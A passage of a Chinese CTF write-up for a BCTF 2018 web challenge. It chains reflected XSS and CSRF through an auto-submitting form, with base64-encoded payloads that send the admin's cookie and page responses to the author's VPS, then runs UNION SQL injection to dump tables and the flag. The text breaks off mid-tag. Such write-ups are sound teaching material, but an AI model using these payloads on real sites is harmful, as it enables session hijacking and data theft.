class="line"><span class="actionscript">            success: <span class="function"><span class="keyword">function</span> <span class="params">(data)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">if</span> (!data[<span class="string">"error"</span>]) &#123;</span></span><br><span class="line"><span class="actionscript">                    data = data[<span class="string">'result'</span>];</span></span><br><span class="line"><span class="actionscript">                    <span class="keyword">var</span> Status = <span class="string">''</span>;</span></span><br><span class="line"><span class="javascript">                    $(<span class="string">'#timestamp'</span>).text(data[<span class="string">'timestamp'</span>]);</span></span><br><span class="line"><span class="javascript">                    $(<span class="string">'#username'</span>).text(data[<span class="string">'user_name'</span>]);</span></span><br><span class="line"><span class="javascript">                    $(<span class="string">'#message'</span>).text(data[<span class="string">'message'</span>]);</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">document</span>.getElementById(<span class="string">"replyuid"</span>).value=data[<span class="string">'uid'</span>];</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">if</span> (<span class="built_in">parseInt</span>(data[<span class="string">'is_checked'</span>]) == <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">                        Status = '<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"color:#04FF00"</span>&gt;</span>Checked<span class="tag">&lt;/<span class="name">div</span>&gt;</span>';</span></span></span><br><span class="line"><span class="actionscript">                    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">                        Status = '<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"color:#FFA500"</span>&gt;</span>Not Checked<span class="tag">&lt;/<span class="name">div</span>&gt;</span>';</span></span></span><br><span class="line">                    &#125;</span><br><span class="line"><span class="javascript">                    <span class="built_in">document</span>.getElementById(<span class="string">"status"</span>).innerHTML = Status;</span></span><br><span class="line">                &#125;</span><br><span class="line"><span class="actionscript">                <span class="keyword">else</span></span></span><br><span class="line"><span class="actionscript">                    alert(<span class="string">'Error: '</span> + data[<span class="string">"error"</span>]);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">view_unreads</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        $.ajax(&#123;</span></span><br><span class="line"><span class="actionscript">            type: <span class="string">"POST"</span>,</span></span><br><span class="line"><span class="actionscript">            url: <span class="string">"/admin/handle_message.php"</span>,</span></span><br><span class="line"><span class="actionscript">            data: &#123;<span class="string">"token"</span>: csrf_token, <span class="string">"action"</span>: <span class="string">"view_unreads"</span>, <span class="string">"status"</span>: <span class="number">0</span>&#125;,</span></span><br><span class="line"><span class="actionscript">            dataType: <span class="string">"json"</span>,</span></span><br><span class="line"><span class="actionscript">            success: <span class="function"><span class="keyword">function</span> <span class="params">(data)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">if</span> (!data[<span class="string">"error"</span>]) &#123;</span></span><br><span class="line"><span class="actionscript">                    data = data[<span class="string">'result'</span>];</span></span><br><span class="line"><span class="actionscript">                    <span class="keyword">var</span> html = <span class="string">''</span>;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">var</span> tbody = <span class="built_in">document</span>.getElementById(<span class="string">"comments"</span>);</span></span><br><span class="line"><span class="actionscript">                    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.length; i++) &#123;</span></span><br><span class="line"><span class="actionscript">                        <span class="keyword">var</span> Time = data[i][<span class="number">0</span>];</span></span><br><span class="line"><span class="actionscript">                        <span class="keyword">var</span> Username = data[i][<span class="number">1</span>];</span></span><br><span class="line"><span class="actionscript">                        <span class="keyword">var</span> Uid = data[i][<span class="number">2</span>];</span></span><br><span class="line"><span class="actionscript">                        <span class="keyword">var</span> Status = <span class="string">''</span>;</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">if</span> (<span class="built_in">parseInt</span>(data[i][<span class="number">3</span>]) == <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">                            Status = '<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"color:#04FF00"</span>&gt;</span>Checked<span class="tag">&lt;/<span class="name">div</span>&gt;</span>';</span></span></span><br><span class="line"><span class="actionscript">                        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">                            Status = '<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"color:#FFA500"</span>&gt;</span>Not Checked<span class="tag">&lt;/<span class="name">div</span>&gt;</span>';</span></span></span><br><span class="line">                        &#125;</span><br><span class="line"><span class="handlebars"><span class="xml">                        html += "<span class="tag">&lt;<span class="name">tr</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span> &gt;</span> <span class="tag">&lt;<span class="name">center</span>&gt;</span> " + Time + " <span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">center</span>&gt;</span> " + Username + " <span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">center</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">onclick</span> = <span class="string">view_uid(</span>'" + <span class="attr">Uid</span> + "') &gt;</span> " + Uid + " <span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">center</span>&gt;</span> " + Status + " <span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">tr</span>&gt;</span>"</span></span></span><br><span class="line">                    &#125;</span><br><span class="line">                    tbody.innerHTML = html;</span><br><span class="line">                &#125;</span><br><span class="line"><span class="actionscript">                <span class="keyword">else</span></span></span><br><span class="line"><span class="actionscript">                    alert(<span class="string">'Error: '</span> + data[<span class="string">"error"</span>]);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">set_reply</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> uid = <span class="built_in">document</span>.getElementById(<span class="string">"replyuid"</span>).value;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span>  reply =  <span class="built_in">document</span>.getElementById(<span class="string">"replymessage"</span>).value;</span></span><br><span class="line"><span class="javascript">        $.ajax(&#123;</span></span><br><span class="line"><span class="actionscript">            type: <span class="string">"POST"</span>,</span></span><br><span class="line"><span class="actionscript">            url: <span class="string">"/admin/handle_message.php"</span>,</span></span><br><span class="line"><span class="actionscript">            data: &#123;<span class="string">"token"</span>: csrf_token, <span class="string">"action"</span>: <span class="string">"set_reply"</span>, <span class="string">"uid"</span>: uid, <span class="string">"reply"</span>: reply&#125;,</span></span><br><span class="line"><span class="actionscript">            dataType: <span class="string">"json"</span>,</span></span><br><span class="line"><span class="actionscript">            success: <span class="function"><span class="keyword">function</span> <span class="params">(data)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">if</span> (!data[<span class="string">"error"</span>]) &#123;</span></span><br><span class="line"><span class="actionscript">                    data = data[<span class="string">'result'</span>];</span></span><br><span class="line"><span class="actionscript">                    alert(<span class="string">'Succ: '</span> + data);</span></span><br><span class="line">                &#125;</span><br><span class="line"><span class="actionscript">                <span class="keyword">else</span></span></span><br><span class="line"><span class="actionscript">                    alert(<span class="string">'Error: '</span> + data[<span class="string">"error"</span>]);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">load_all</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        $.ajax(&#123;</span></span><br><span class="line"><span class="actionscript">            type: <span class="string">"POST"</span>,</span></span><br><span class="line"><span class="actionscript">            url: <span class="string">"/admin/handle_message.php"</span>,</span></span><br><span class="line"><span class="actionscript">            data: &#123;<span class="string">"token"</span>: csrf_token, <span class="string">"action"</span>: <span class="string">"load_all"</span>&#125;,</span></span><br><span class="line"><span class="actionscript">            dataType: <span class="string">"json"</span>,</span></span><br><span class="line"><span class="actionscript">            success: <span class="function"><span class="keyword">function</span> <span class="params">(data)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">if</span> (!data[<span class="string">"error"</span>]) &#123;</span></span><br><span class="line"><span class="actionscript">                    data = data[<span class="string">'result'</span>];</span></span><br><span class="line"><span class="actionscript">                    <span class="keyword">var</span> html = <span class="string">''</span>;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">var</span> tbody = <span class="built_in">document</span>.getElementById(<span class="string">"comments"</span>);</span></span><br><span class="line"><span class="actionscript">                    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.length; i++) &#123;</span></span><br><span class="line"><span class="actionscript">                        <span class="keyword">var</span> Time = data[i][<span class="number">0</span>];</span></span><br><span class="line"><span class="actionscript">                        <span class="keyword">var</span> Username = data[i][<span class="number">1</span>];</span></span><br><span class="line"><span class="actionscript">                        <span class="keyword">var</span> Uid = data[i][<span class="number">2</span>];</span></span><br><span class="line"><span class="actionscript">                        <span class="keyword">var</span> Status = <span class="string">''</span>;</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">if</span> (<span class="built_in">parseInt</span>(data[i][<span class="number">3</span>]) == <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">                            Status = '<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"color:#04FF00"</span>&gt;</span>Checked<span class="tag">&lt;/<span class="name">div</span>&gt;</span>';</span></span></span><br><span class="line"><span class="actionscript">                        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">                            Status = '<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"color:#FFA500"</span>&gt;</span>Not Checked<span class="tag">&lt;/<span class="name">div</span>&gt;</span>';</span></span></span><br><span class="line">                        &#125;</span><br><span class="line"><span class="handlebars"><span class="xml">                        html += "<span class="tag">&lt;<span class="name">tr</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span> &gt;</span> <span class="tag">&lt;<span class="name">center</span>&gt;</span> " + Time + " <span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">center</span>&gt;</span> " + Username + " <span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">center</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">onclick</span> = <span class="string">view_uid(</span>'" + <span class="attr">Uid</span> + "') &gt;</span> " + Uid + " <span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">center</span>&gt;</span> " + Status + " <span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">tr</span>&gt;</span>"</span></span></span><br><span class="line">                    &#125;</span><br><span class="line">                    tbody.innerHTML = html;</span><br><span class="line">                &#125;</span><br><span class="line"><span class="actionscript">                <span class="keyword">else</span></span></span><br><span class="line"><span class="actionscript">                    alert(<span class="string">'Error: '</span> + data[<span class="string">"error"</span>]);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    setTimeout(load_all, 1000);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- header --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"logo"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"./index.php"</span>&gt;</span>Seafaring <span class="tag">&lt;<span class="name">span</span>&gt;</span>A Travel Agency<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"logo-right"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>gml<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"./logout.php"</span>&gt;</span>Exit<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"clearfix"</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header-nav"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">"navbar navbar-default"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Brand and toggle get grouped for better mobile display --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"navbar-header"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"navbar-toggle collapsed"</span> <span class="attr">data-toggle</span>=<span class="string">"collapse"</span> <span class="attr">data-target</span>=<span class="string">"#bs-example-navbar-collapse-1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sr-only"</span>&gt;</span>Toggle navigation<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Collect the nav links, forms, and other content for toggling --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"collapse navbar-collapse nav-wil"</span> <span class="attr">id</span>=<span class="string">"bs-example-navbar-collapse-1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">"cl-effect-1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav navbar-nav"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"./index.php"</span> &gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"../contact.php"</span> &gt;</span>Contact<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="comment">&lt;!-- /.navbar-collapse --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'Sorry, You aren\'t admin :)'</span>);location.href=<span class="string">'../index.php'</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>/admin/handle_message.php</code>直接将 post 的 token 输出了：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-151c8cafab98639b.png" alt="image.png"></p><p>猜想这里有 xss， <code>/</code>被转义了，尝试弹框：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-18ac4438c41ec131.png" alt="image.png"></p><p>可以通过 xss+csrf 的方式打 cookie，在自己 vps 上放一段自动请求<code>/admin/handle_message.php</code>的代码，带上管理员的 cookie，就可以打到管理员的 cookie。</p><p>在自己的 vps 上放一个 gml.html:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"http://ctf.momomoxiaoxi.com:9999/admin/handle_message.php"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"token"</span> <span class="attr">value</span>=<span class="string">"&lt;img src=x onerror=document.write(atob('PHNjcmlwdD4KbG9jYXRpb249Imh0dHA6Ly8qKioqOjIzMzMvP2M9Iitlc2NhcGUoZG9jdW1lbnQuY29va2llKTsKPC9zY3JpcHQ+'))&gt;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.forms[<span class="number">0</span>].submit();</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里采用了 @zzm 师傅的方式，采用 base64 编码，小西师傅出题笔记里用的是 String.fromCharCode 。</p><p>在 <code>contact.php</code> 里让 bot 访问自己 vps 上的 gml.html，同时监听 2333 端口：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-9d1ba4d060a0a576.png" alt="image.png"></p><p>可以打到管理员的 cookie。</p><p>进了管理员后台，发现 <code>contact.php</code>里有个 web2 的提示：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-ea966dbf0fc5462c.png" alt="image.png"></p><p>显然 web1 应该还有别的东西。</p><p>开始的时候我们发现泄露的 api 里，有一个 status 参数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">view_unreads</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            type: <span class="string">"POST"</span>,</span><br><span class="line">            url: <span class="string">"/admin/handle_message.php"</span>,</span><br><span class="line">            data: &#123;<span class="string">"token"</span>: csrf_token, <span class="string">"action"</span>: <span class="string">"view_unreads"</span>, <span class="string">"status"</span>: <span class="number">0</span>&#125;,</span><br><span class="line">            dataType: <span class="string">"json"</span>,</span><br><span class="line">            success: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (!data[<span class="string">"error"</span>]) &#123;</span><br><span class="line">                    data = data[<span class="string">'result'</span>];</span><br><span class="line">                    <span class="keyword">var</span> html = <span class="string">''</span>;</span><br><span class="line">                    <span class="keyword">var</span> tbody = <span class="built_in">document</span>.getElementById(<span class="string">"comments"</span>);</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.length; i++) &#123;</span><br><span class="line">                        <span class="keyword">var</span> Time = data[i][<span class="number">0</span>];</span><br><span class="line">                        <span class="keyword">var</span> Username = data[i][<span class="number">1</span>];</span><br><span class="line">                        <span class="keyword">var</span> Uid = data[i][<span class="number">2</span>];</span><br><span class="line">                        <span class="keyword">var</span> Status = <span class="string">''</span>;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">parseInt</span>(data[i][<span class="number">3</span>]) == <span class="number">1</span>) &#123;</span><br><span class="line">                            Status = <span class="string">'&lt;div style="color:#04FF00"&gt;Checked&lt;/div&gt;'</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            Status = <span class="string">'&lt;div style="color:#FFA500"&gt;Not Checked&lt;/div&gt;'</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        html += <span class="string">"&lt;tr&gt; &lt;td &gt; &lt;center&gt; "</span> + Time + <span class="string">" &lt;/center&gt;&lt;/td&gt; &lt;td&gt; &lt;center&gt; "</span> + Username + <span class="string">" &lt;/center&gt;&lt;/td&gt; &lt;td&gt; &lt;center&gt; &lt;a onclick = view_uid('"</span> + Uid + <span class="string">"') &gt; "</span> + Uid + <span class="string">" &lt;/a&gt;&lt;/center&gt; &lt;/td&gt; &lt;td&gt; &lt;center&gt; "</span> + Status + <span class="string">" &lt;/center&gt;&lt;/td&gt; &lt;/tr&gt;"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    tbody.innerHTML = html;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    alert(<span class="string">'Error: '</span> + data[<span class="string">"error"</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里 status 处存在注入，我们 post 正确的 token ，发现只有服务器本地可以交互：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-589914a6998df1e5.png" alt="image.png"></p><p>所以要 xss+csrf 获取内容，而每次要 post 正确的 token，所以要写个 js 来请求页面获得正确的 token 并提交。</p><p>payload 如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> aa = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">aa.open(<span class="string">'GET'</span>, <span class="string">'http://ctf.momomoxiaoxi.com:9999/contact.php'</span>, <span class="literal">false</span>);</span><br><span class="line">aa.send();</span><br><span class="line">bb = aa.responseText;</span><br><span class="line">token = bb.match(<span class="regexp">/csrf_token = "(\w+)"/</span>)[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">a.open(<span class="string">'POST'</span>, <span class="string">'http://ctf.momomoxiaoxi.com:9999/admin/handle_message.php'</span>, <span class="literal">false</span>);</span><br><span class="line">a.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">a.send(<span class="string">"token="</span>+token+<span class="string">"&amp;action=view_unreads&amp;status=-1  order by 3#"</span>);</span><br><span class="line">b = a.responseText;</span><br><span class="line">location.href = <span class="string">'http://vps:2333/?token='</span>+token+<span class="string">'&amp;content='</span> + <span class="built_in">escape</span>(b);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>把这段 base64 编码，放入 gml.html 中：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"http://ctf.momomoxiaoxi.com:9999/admin/handle_message.php"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"token"</span> <span class="attr">value</span>=<span class="string">"&lt;img src=x onerror=document.write(atob('base64(payload)'))&gt;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.forms[<span class="number">0</span>].submit();</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>让 bot 访问，打回来的信息：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-04b08aadae37a33d.png" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">token=53fa3bf04f6342ed2bbad38c3ce08af6&amp;content=&#123;&quot;result&quot;:&quot;&quot;,&quot;error&quot;:&quot;sql query error! debug info:SELECT timestamp,user_name,uid,is_checked FROM feedbacks  where is_checked=-1 order by 3# ORDER BY id DESC limit 0,50&quot;&#125;</span><br></pre></td></tr></table></figure><p>把报错信息都给出来了，看数据库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">status=-1 union select 1,database(),3,4#</span><br></pre></td></tr></table></figure><p>返回：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?token=71824ddc687a213d91b0376c81aa0dae&amp;content=&#123;&quot;result&quot;:[[&quot;1&quot;,&quot;bctf2018&quot;,&quot;3&quot;,&quot;4&quot;]],&quot;error&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure><p>看表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">status=-1 union select 1,table_name,3,4 from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure><p>返回：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">token=9914988256d8169f0d3d4bd4b3e45285&amp;content=&#123;&quot;result&quot;:[[&quot;1&quot;,&quot;admin&quot;,&quot;3&quot;,&quot;4&quot;],[&quot;1&quot;,&quot;f111111ag&quot;,&quot;3&quot;,&quot;4&quot;],[&quot;1&quot;,&quot;feedbacks&quot;,&quot;3&quot;,&quot;4&quot;]],&quot;error&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure><p>查 flag:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">status=-1 union select *,2,3,4 from f111111ag#</span><br></pre></td></tr></table></figure><p>返回：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-d63b58e4c6c97c39.png" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 